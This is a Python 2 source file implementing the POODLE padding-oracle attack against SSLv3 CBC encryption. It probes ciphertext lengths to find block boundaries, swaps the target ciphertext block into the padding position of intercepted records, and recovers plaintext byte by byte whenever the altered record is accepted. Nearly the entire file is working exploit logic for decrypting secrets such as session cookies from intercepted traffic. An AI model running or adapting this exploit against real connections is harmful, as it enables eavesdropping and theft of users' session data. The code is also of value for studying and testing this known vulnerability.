
class POODLE(object):

  PHASE_BOUNDS_CHECK = 0
  PHASE_EXPLOIT = 1

  def __init__(self):
    self.phase = POODLE.PHASE_BOUNDS_CHECK
    self.recovery_length = None
    self.block_edge = None
    self.block_size = None
    self.was_error = False
    self.was_success = False
    self.message = None
    return

  def mark_error(self):
    self.was_error = True
    return

  def mark_success(self):
    self.was_success = True
    return

  def run(self):
    self.detect_block_info()
    print "Block edge: %u" % (self.block_edge, )
    self.phase = POODLE.PHASE_EXPLOIT
    self.exploit()
    return

  def exploit(self):
    plaintext = []
    for block in range(1, self.recovery_length / self.block_size):
      for i in reversed(range(self.block_size)):
        plain = self.find_byte(block, i)
        plaintext.append(plain)
    return

  def find_byte(self, block, byte):
    if block < 1:
      raise RuntimeError('Cannot work on block 0')
    self.target_block = block
    for tries in range(1000):
      self.was_error = False
      self.was_success = False

      prefix_length = self.block_size + byte
      suffix_length = self.block_size - byte

      self.trigger('A'*(self.block_edge+prefix_length), 'A'*suffix_length)
      if self.was_success:
        plain = chr(ord(self.block(block-1)[-1]) ^ ord(self.block(-2)[-1]) ^ (self.block_size-1))
        print 'Found byte %u after %u tries: %c' % (byte, tries, plain)
        return plain

    return

  def message_callback(self, msg):
    self.message = msg
    if self.phase != POODLE.PHASE_EXPLOIT:
      return msg
    return self.alter()

  def alter(self):
    msg = bytearray(self.message)
    msg = msg[:-self.block_size] + self.block(self.target_block)
    return str(msg)

  def block(self, n):
    return self.message[n*self.block_size:(n+1)*self.block_size]

  def detect_block_info(self):
    reference = len(self.trigger(''))
    self.recovery_length = len(self.message)

    for i in range(16):
      msg = self.trigger('A'*i)
      if len(msg) != reference:
        self.block_edge = i
        break

    reference = len(self.trigger('A'*(self.block_edge)))
    for i in range(self.block_edge, self.block_edge+17):
      msg = self.trigger('A'*i)
      if len(msg) != reference:
        self.block_size = i-self.block_edge
        break
    return

